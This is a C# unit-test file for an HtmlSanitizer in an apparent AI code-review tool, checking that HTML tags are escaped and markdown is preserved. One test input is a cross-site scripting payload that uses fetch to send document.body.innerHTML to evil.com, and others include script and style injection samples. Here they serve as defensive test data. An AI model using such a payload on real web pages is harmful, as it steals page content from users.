// Copyright (c) Andreas Rain.
// Licensed under the Elastic License 2.0. See LICENSE file in the project root for full license terms.

using System.Text;
using MeisterProPR.Infrastructure.Utilities;

namespace MeisterProPR.Infrastructure.Tests.Utilities;

/// <summary>
///     Tests for HtmlSanitizer to ensure HTML injection prevention
///     while preserving markdown formatting.
/// </summary>
public class HtmlSanitizerTests
{
    [Fact]
    public void Sanitize_NullInput_ReturnsEmpty()
    {
        var result = HtmlSanitizer.Sanitize(null);
        Assert.Equal(string.Empty, result);
    }

    [Fact]
    public void Sanitize_EmptyInput_ReturnsEmpty()
    {
        var result = HtmlSanitizer.Sanitize(string.Empty);
        Assert.Equal(string.Empty, result);
    }

    [Fact]
    public void Sanitize_PlainText_Unchanged()
    {
        const string input = "This is plain text with no special characters.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_StyleTag_Escaped()
    {
        const string input = "<style>body { color: red; }</style>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;style&gt;body { color: red; }&lt;/style&gt;", result);
    }

    [Fact]
    public void Sanitize_ScriptTag_Escaped()
    {
        const string input = "<script>alert('xss')</script>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;script&gt;alert('xss')&lt;/script&gt;", result);
    }

    [Fact]
    public void Sanitize_DivTag_Escaped()
    {
        const string input = "<div class='danger'>Content</div>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;div class='danger'&gt;Content&lt;/div&gt;", result);
    }

    [Fact]
    public void Sanitize_DocTypeDeclaration_Escaped()
    {
        const string input = "<!DOCTYPE html>\n<html>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;!DOCTYPE html&gt;\n&lt;html&gt;", result);
    }

    [Fact]
    public void Sanitize_MarkdownBold_Preserved()
    {
        const string input = "This is **bold** text.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownItalic_Preserved()
    {
        const string input = "This is *italic* or _also italic_ text.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownCodeFence_Preserved()
    {
        const string input = "```\ncode here\n```";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownLink_Preserved()
    {
        const string input = "Check [this link](https://example.com).";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_MarkdownList_Preserved()
    {
        const string input = "- Item 1\n- Item 2\n- Item 3";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(input, result);
    }

    [Fact]
    public void Sanitize_CodeWithAngleBracketsInFence_EscapedCorrectly()
    {
        const string input = "```\npublic class Foo<T> { }\n```";
        var result = HtmlSanitizer.Sanitize(input);
        // Note: Even code inside backticks gets escaped. This is intentional.
        // The advantage: prevents any angle bracket from causing HTML issues.
        // Users can use backticks or code fences as additional protection.
        Assert.Equal("```\npublic class Foo&lt;T&gt; { }\n```", result);
    }

    [Fact]
    public void Sanitize_MultipleHtmlTags_AllEscaped()
    {
        const string input = "Text with <style> and <script> and <div> tags.";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("Text with &lt;style&gt; and &lt;script&gt; and &lt;div&gt; tags.", result);
    }

    [Fact]
    public void Sanitize_GreaterThanLessThan_Escaped()
    {
        const string input = "if (x > 5 && y < 10) { }";
        var result = HtmlSanitizer.Sanitize(input);
        // HtmlSanitizer only escapes < and > to prevent HTML injection, not other characters
        Assert.Equal("if (x &gt; 5 && y &lt; 10) { }", result);
    }

    [Fact]
    public void Sanitize_IFrameTag_Escaped()
    {
        const string input = "<iframe src='malicious.html'></iframe>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;iframe src='malicious.html'&gt;&lt;/iframe&gt;", result);
    }

    [Fact]
    public void SanitizeInPlace_AppliesChanges()
    {
        var builder = new StringBuilder("<style>test</style>");
        HtmlSanitizer.SanitizeInPlace(builder);
        Assert.Equal("&lt;style&gt;test&lt;/style&gt;", builder.ToString());
    }

    [Fact]
    public void SanitizeInPlace_WithNull_ThrowsArgumentNull()
    {
        Assert.Throws<ArgumentNullException>(() => HtmlSanitizer.SanitizeInPlace(null!));
    }

    [Fact]
    public void Sanitize_ComplexMaliciousPayload_SafelyEscaped()
    {
        const string input =
            "Check this review: <script>fetch('http://evil.com?data=' + document.body.innerHTML)</script>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal(
            "Check this review: &lt;script&gt;fetch('http://evil.com?data=' + document.body.innerHTML)&lt;/script&gt;",
            result);
    }

    [Fact]
    public void Sanitize_AdoCommentWithStyleTagInjection_Prevented()
    {
        // This represents what an AI might accidentally generate
        const string input =
            """
            ERROR: Missing null check here.
            <style>
            body {
                display: none;
            }
            </style>
            """;
        var result = HtmlSanitizer.Sanitize(input);
        Assert.DoesNotContain("<style>", result);
        Assert.DoesNotContain("</style>", result);
        Assert.Contains("&lt;style&gt;", result);
        Assert.Contains("&lt;/style&gt;", result);
    }

    [Fact]
    public void Sanitize_ReviewSummaryWithCodeExample_Preserved()
    {
        const string input =
            """
            **Summary**

            Found 2 issues:

            1. Missing index on `users` table
            2. Generic constraint issue with `Foo<T>`
            """;
        var result = HtmlSanitizer.Sanitize(input);
        // Note: Angle brackets are escaped even inside backticks for maximum safety.
        // The markdown rendering will still preserve the backticks and format correctly,
        // while preventing any HTML injection via those characters.
        Assert.Contains("&lt;T&gt;", result);
        Assert.DoesNotContain("<T>", result);
    }

    [Fact]
    public void Sanitize_ConsecutiveAngleBrackets_AllEscaped()
    {
        const string input = "<<< malicious >>>";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("&lt;&lt;&lt; malicious &gt;&gt;&gt;", result);
    }

    [Fact]
    public void Sanitize_AttributeWithQuotesEscaped()
    {
        const string input = """<img src="test.jpg" alt="bad<>quotes">""";
        var result = HtmlSanitizer.Sanitize(input);
        Assert.Equal("""&lt;img src="test.jpg" alt="bad&lt;&gt;quotes"&gt;""", result);
    }
}
